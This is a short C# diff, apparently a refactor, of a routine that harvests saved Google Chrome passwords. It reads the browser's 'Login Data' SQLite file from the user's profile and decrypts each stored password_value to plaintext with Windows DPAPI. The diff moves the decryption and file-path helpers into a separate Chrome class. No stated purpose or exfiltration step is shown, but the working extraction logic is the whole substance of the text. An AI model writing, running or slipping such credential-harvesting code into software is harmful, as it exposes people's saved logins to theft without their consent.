@@ -14,7 +14,7 @@
 		public static List<Credentials> GetChromePasswords()
 		{
 			var credentials = new List<Credentials>();
-			SqliteConnection connection = CreateConnection(GetChromePasswordsFile());
+			SqliteConnection connection = CreateConnection(Chrome.GetPasswordsFile());
 			try
 			{
 				connection.Open();
@@ -25,7 +25,7 @@
 					{
 						while (reader.Read())
 						{
-							string password = ChromeDecrypt(reader["password_value"] as byte[]);
+							string password = Chrome.Decrypt(reader["password_value"] as byte[]);
 							credentials.Add(
 								new Credentials
 									{
@@ -62,19 +62,6 @@
 			return connection;
 		}
 
-		private static string ChromeDecrypt(byte[] blob)
-		{
-			byte[] decryptedBytes = ProtectedData.Unprotect(blob, null, DataProtectionScope.CurrentUser);
-			return Encoding.UTF8.GetString(decryptedBytes);
-		}
-
-		private static string GetChromePasswordsFile()
-		{
-			string localApplicationPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
-			string fileName = Path.Combine(localApplicationPath, "Google", "Chrome", "User Data", "Default", "Login Data");
-
-			return fileName;
-		}
 
 		#endregion
 	}
